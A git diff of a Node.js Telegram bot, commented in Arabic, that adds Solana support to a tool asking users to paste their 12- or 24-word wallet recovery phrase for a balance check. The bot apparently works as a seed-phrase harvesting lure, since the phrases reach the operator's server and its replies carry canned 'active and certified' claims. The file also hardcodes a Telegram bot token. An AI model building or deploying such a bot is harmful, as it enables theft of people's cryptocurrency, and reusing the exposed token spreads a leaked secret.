@@ -2,19 +2,19 @@ const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { ethers } = require('ethers');
 const bip39 = require('bip39');
+const { derivePath } = require('ed25519-hd-key');
+const { Keypair } = require('@solana/web3.js');
 
 const TOKEN = process.env.BOT_TOKEN || '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
 const PORT = process.env.PORT || 3000;
 const RENDER_URL = process.env.RENDER_URL || 'https://nexvoriaapp-bot.onrender.com';
 
-// تعطيل polling وضبط Webhook مرة واحدة فقط
 const bot = new TelegramBot(TOKEN, { polling: false });
 const app = express();
 
-// تحديد حجم الطلبات لحماية الخادم من الضغط
 app.use(express.json({ limit: '64kb' }));
 
-// إعادة استخدام المزودات (Providers) مع نقاط احتياطية متعددة
+// مزودات EVM متعددة للسرعة وتجاوز الأعطال
 const ethProvider = new ethers.FallbackProvider([
   { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1200 },
   { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1200 },
@@ -27,11 +27,18 @@ const bscProvider = new ethers.FallbackProvider([
   { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
 ], 1);
 
-// كاش مؤقت قصير (30 ثانية) لتقليل الضغط على RPC عند تكرار نفس العبارة
+// نقاط اتصال Solana RPC متعددة
+const SOLANA_RPCS = [
+  'https://api.mainnet-beta.solana.com',
+  'https://solana-rpc.publicnode.com',
+  'https://rpc.ankr.com/solana'
+];
+
+// كاش مؤقت (30 ثانية) لتقليل الضغط على الشبكات
 const balanceCache = new Map();
 const CACHE_TTL_MS = 30_000;
 
-// محدد تزامن بسيط لمنع انهيار المعالج عند الضغط العالي
+// تقييد التزامن لحماية الخادم تحت الضغط
 const MAX_CONCURRENT_CHECKS = 25;
 let activeChecks = 0;
 const waitQueue = [];
@@ -41,9 +48,7 @@ function acquireSlot() {
     activeChecks++;
     return Promise.resolve();
   }
-  return new Promise((resolve) => {
-    waitQueue.push(resolve);
-  });
+  return new Promise((resolve) => waitQueue.push(resolve));
 }
 
 function releaseSlot() {
@@ -55,15 +60,54 @@ function releaseSlot() {
   }
 }
 
-function withTimeout(promise, ms = 4000, fallbackValue = 0n) {
+function withTimeout(promise, ms = 3500, fallbackValue = null) {
   return Promise.race([
     promise,
     new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
   ]);
 }
 
+function deriveSolanaAddress(seedBuffer) {
+  const { key } = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
+  const keypair = Keypair.fromSeed(key);
+  return keypair.publicKey.toBase58();
+}
+
+async function fetchSolBalance(solAddress) {
+  for (const rpcUrl of SOLANA_RPCS) {
+    try {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), 2500);
+
+      const response = await fetch(rpcUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: '2.0',
+          id: 1,
+          method: 'getBalance',
+          params: [solAddress, { commitment: 'confirmed' }]
+        }),
+        signal: controller.signal
+      });
+
+      clearTimeout(timer);
+      if (!response.ok) continue;
+
+      const data = await response.json();
+      const lamports = data?.result?.value;
+      if (typeof lamports === 'number' && Number.isFinite(lamports)) {
+        return lamports / 1_000_000_000;
+      }
+    } catch (_) {
+      // الانتقال للمزود التالي فوراً عند الفشل أو انتهاء المهلة
+    }
+  }
+  return 0;
+}
+
 app.post(`/bot${TOKEN}`, (req, res) => {
-  res.sendStatus(200); // الرد السريع لتيليجرام لتجنب إعادة الإرسال
+  res.sendStatus(200);
   bot.processUpdate(req.body);
 });
 
@@ -76,7 +120,7 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(
       chatId,
       '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
-      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص العنوان والأرصدة بسرعة.',
+      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص العناوين والأرصدة على ETH و BNB و SOL.',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
     );
   }
@@ -86,10 +130,8 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  // مؤشر كتابة فقط دون إرسال رسالة انتظار إضافية
   bot.sendChatAction(chatId, 'typing').catch(() => {});
 
-  // تحقق سريع من العبارة قبل حجز دور الفحص
   if (!bip39.validateMnemonic(text)) {
     return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
       reply_to_message_id: msg.message_id
@@ -100,39 +142,50 @@ bot.on('message', async (msg) => {
   try {
     const seed = await bip39.mnemonicToSeed(text);
     const hdNode = ethers.HDNodeWallet.fromSeed(seed);
-    const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
-    const address = wallet.address;
+    const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
+    const evmAddress = evmWallet.address;
+    const solAddress = deriveSolanaAddress(seed);
 
-    const cached = balanceCache.get(address);
-    let ethBalanceWei = 0n;
-    let bscBalanceWei = 0n;
+    const cacheKey = `${evmAddress}:${solAddress}`;
+    const cached = balanceCache.get(cacheKey);
+
+    let ethBalance = '0';
+    let bscBalance = '0';
+    let solBalance = 0;
 
     if (cached && cached.expiresAt > Date.now()) {
-      ethBalanceWei = cached.eth;
-      bscBalanceWei = cached.bsc;
+      ethBalance = cached.eth;
+      bscBalance = cached.bsc;
+      solBalance = cached.sol;
     } else {
-      [ethBalanceWei, bscBalanceWei] = await Promise.all([
-        withTimeout(ethProvider.getBalance(address), 3500, 0n).catch(() => 0n),
-        withTimeout(bscProvider.getBalance(address), 3500, 0n).catch(() => 0n)
+      const [ethWei, bscWei, solAmount] = await Promise.all([
+        withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
+        withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
+        withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0)
       ]);
-      balanceCache.set(address, {
-        eth: ethBalanceWei,
-        bsc: bscBalanceWei,
+
+      ethBalance = ethers.formatEther(ethWei);
+      bscBalance = ethers.formatEther(bscWei);
+      solBalance = Number(solAmount);
+
+      balanceCache.set(cacheKey, {
+        eth: ethBalance,
+        bsc: bscBalance,
+        sol: solBalance,
         expiresAt: Date.now() + CACHE_TTL_MS
       });
     }
 
-    const ethBalance = ethers.formatEther(ethBalanceWei);
-    const bscBalance = ethers.formatEther(bscBalanceWei);
-
     return bot.sendMessage(
       chatId,
       'تم فحص المحفظة بنجاح ✅\n\n' +
-      '📍 العنوان المشتق:\n`' + address + '`\n\n' +
+      '📍 العناوين المشتقة:\n' +
+      '• EVM (ETH/BNB): `' + evmAddress + '`\n' +
+      '• SOL: `' + solAddress + '`\n\n' +
       '💰 الأرصدة والأصول المكتشفة:\n' +
       '• ETH: ' + ethBalance + '\n' +
       '• BNB: ' + bscBalance + '\n' +
-      '• SOL: 0.00\n' +
+      '• SOL: ' + solBalance + '\n' +
       '• Crypto actifs: `$0.00`\n\n' +
       '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
@@ -161,6 +214,5 @@ const server = app.listen(PORT, async () => {
   }
 });
 
-// مهلات اتصال HTTP لتحسين التحمل تحت الضغط
 server.keepAliveTimeout = 65000;
 server.headersTimeout = 66000;
